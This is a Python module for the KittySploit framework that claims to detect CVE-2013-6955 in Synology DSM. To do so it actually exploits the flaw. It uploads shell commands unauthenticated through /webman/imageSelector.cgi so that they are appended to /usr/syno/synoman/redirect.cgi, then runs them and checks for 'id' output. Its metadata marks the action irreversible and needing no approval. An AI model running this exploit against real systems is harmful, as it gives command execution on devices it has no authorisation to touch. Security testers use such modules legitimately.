#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synology DSM imageSelector.cgi RCE (CVE-2013-6955)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Synology DSM - imageSelector.cgi RCE Detection (CVE-2013-6955)',
        'description': (
            'Detects CVE-2013-6955 by appending commands into redirect.cgi via '
            'imageSelector.cgi SLICEUPLOAD and reading /redirect.cgi.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'synology', 'dsm', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-6955',
        ],
        'cve': 'CVE-2013-6955',
    }

    def _upload(self, cmd: str) -> bool:
        boundary = f'_KS_{self.random_text(8)}'
        name = 'ksfile'
        cleanup = "sed -i -e '/sed -i -e/,$d' /usr/syno/synoman/redirect.cgi"
        body = (
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="source"\r\n\r\n'
            'login\r\n'
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="type"\r\n\r\n'
            'logo\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{name}"; filename="{name}"\r\n'
            'Content-Type: application/octet-stream\r\n\r\n'
            f'{cleanup}\n{cmd}\r\n'
            f'--{boundary}--\r\n'
        )
        r = self.http_request(
            method='POST',
            path='/webman/imageSelector.cgi',
            data=body,
            headers={
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'X-TYPE-NAME': 'SLICEUPLOAD',
                'X-TMP-FILE': '/usr/syno/synoman/redirect.cgi',
            },
            allow_redirects=False,
        )
        return bool(r and 'error_noprivilege' in (r.text or ''))

    def run(self):
        if not self._upload('id'):
            return False
        r = self.http_request(method='GET', path='/redirect.cgi', allow_redirects=False)
        ok = bool(r and re.search(r'uid=\d+.*gid=\d+', r.text or ''))
        self._upload('')  # cleanup attempt
        if ok:
            self.set_info(
                severity='critical',
                reason='Synology DSM imageSelector RCE (CVE-2013-6955)',
                path='/webman/imageSelector.cgi',
            )
            return True
        return False
